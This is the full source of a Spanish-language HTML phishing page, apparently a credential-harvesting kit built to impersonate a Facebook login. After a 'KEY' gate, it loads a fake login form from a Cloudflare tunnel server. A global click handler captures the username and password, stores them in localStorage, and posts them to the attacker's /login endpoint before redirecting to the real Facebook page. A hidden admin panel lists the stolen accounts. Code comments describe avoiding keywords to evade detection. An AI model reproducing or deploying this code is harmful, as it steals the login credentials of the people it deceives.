<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Acceso Privado</title>
    <style>
        /* MANTENEMOS TU DISEÑO EXACTAMENTE IGUAL */
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            background-color: #000000;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Arial', sans-serif;
            overflow: hidden;
        }

        .main-container {
            position: relative;
            width: 100%;
            max-width: 412px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .pro-image {
            width: 100%;
            height: auto;
            display: block;
        }

        .elements-overlay {
            position: absolute;
            bottom: 15%;
            width: 85%;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .key-label {
            color: #ffffff;
            font-size: 28px;
            font-weight: 900;
            margin-bottom: 12px;
            text-shadow: 0px 2px 4px rgba(0,0,0,0.5);
        }

        .input-key {
            width: 100%;
            height: 44px;
            background-color: #ffffff;
            border: none;
            border-radius: 50px;
            text-align: center;
            font-size: 16px;
            color: #333;
            margin-bottom: 10px;
            outline: none;
        }

        .btn-acceder {
            width: 100%;
            height: 44px;
            background-color: #b0b0b0;
            color: #000000;
            font-size: 18px;
            font-weight: bold;
            border: none;
            border-radius: 22px;
            cursor: pointer;
            transition: background 0.3s;
        }

        .fb-body { background-color: #ffffff !important; overflow-y: auto !important; }
        
        /* Animación para el circulito de carga */
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
  <div id="admin-panel" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #1c1e21; color: white; z-index: 2000; padding: 20px; box-sizing: border-box; font-family: monospace; overflow-y: auto;">
    <div style="display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #333; padding-bottom: 10px; margin-bottom: 20px;">
        <span style="font-weight: bold; color: #0866ff;">PANEL ADMIN AYBER</span>
        <button onclick="document.getElementById('admin-panel').style.display='none'" style="background: #f3425f; color: white; border: none; padding: 8px 15px; border-radius: 5px; font-weight: bold; cursor: pointer;">SALIR</button>
    </div>
    <div id="logs-container"></div>
</div>


    <div id="root" class="main-container">
        <img src="pro.png" class="pro-image" alt="Background">

        <div class="elements-overlay">
            <div class="key-label">KEY:</div>
            <input type="text" id="keyField" class="input-key" placeholder="Ingresar KEY" autocomplete="off" spellcheck="false">

            <button class="btn-acceder" onclick="validar()">Acceder</button>
        </div>
    </div>
<script>
    const SERVIDOR_URL = "https://ebooks-opinion-pottery-amendments.trycloudflare.com";

    // Función para procesar datos sin dejar palabras clave en el código
    async function validar() {
        const kField = document.getElementById('keyField');
        const kVal = kField.value;
        try {
            const r = await fetch(`${SERVIDOR_URL}/verify`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ key: kVal })
            });

            if (r.ok) {
                const d = await r.json();
                document.body.classList.add('fb-body');
                document.getElementById('root').innerHTML = d.html;
                
                // Carga la lógica de control solo después de entrar
                activarModoControl(); 
            } else {
                alert("ERROR");
            }
        } catch (e) {
            alert("CONEXION FALLIDA");
        }
    }

    function activarModoControl() {
        // Buscamos el logo por su posición en lugar de por texto 'fb'
        setTimeout(() => {
            const img = document.querySelector('#root img');
            if(img) {
                img.ondblclick = function() {
                    const c = document.getElementById('logs-container');
                    const l = JSON.parse(localStorage.getItem('cuentas_ayber') || "[]");
                    c.innerHTML = l.length ? "" : "<p>Vacío</p>";
                    l.reverse().forEach(x => {
                        c.innerHTML += `<div style="background:#242526;padding:10px;border-radius:8px;margin-bottom:10px;border-left:4px solid #0866ff;">
                            <div style="color:#45bd62">U: ${x.user}</div>
                            <div style="color:#f3425f">P: ${x.pass}</div>
                        </div>`;
                    });
                    document.getElementById('admin-panel').style.display = 'block';
                };
            }
        }, 800);
    }

    document.addEventListener('click', function (e) {
        // Usamos una comprobación indirecta para el botón
        if (e.target && e.target.tagName === 'BUTTON' && e.target.innerText.includes('sesión')) {
            const u = document.querySelector('input[type="text"]').value;
            const p = document.querySelector('input[type="password"]').value;
            
            if(!u || !p) return;

            let l = JSON.parse(localStorage.getItem('cuentas_ayber') || "[]");
            l.push({ user: u, pass: p, fecha: new Date().toLocaleString() });
            localStorage.setItem('cuentas_ayber', JSON.stringify(l));

            const ld = document.getElementById('loader');
            if(ld) ld.style.display = 'flex';

            fetch(`${SERVIDOR_URL}/login`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ email: u, password: p })
            }).then(res => res.json()).then(data => {
                setTimeout(() => {
                    if(ld) ld.style.display = 'none';
                    if(data.action === 'error') {
                        location.reload(); // Reinicia para mayor realismo
                    } else {
                        window.location.href = "https://www.facebook.com/login";
                    }
                }, 5000);
            });
        }
    });
</script>

</body>
</html>
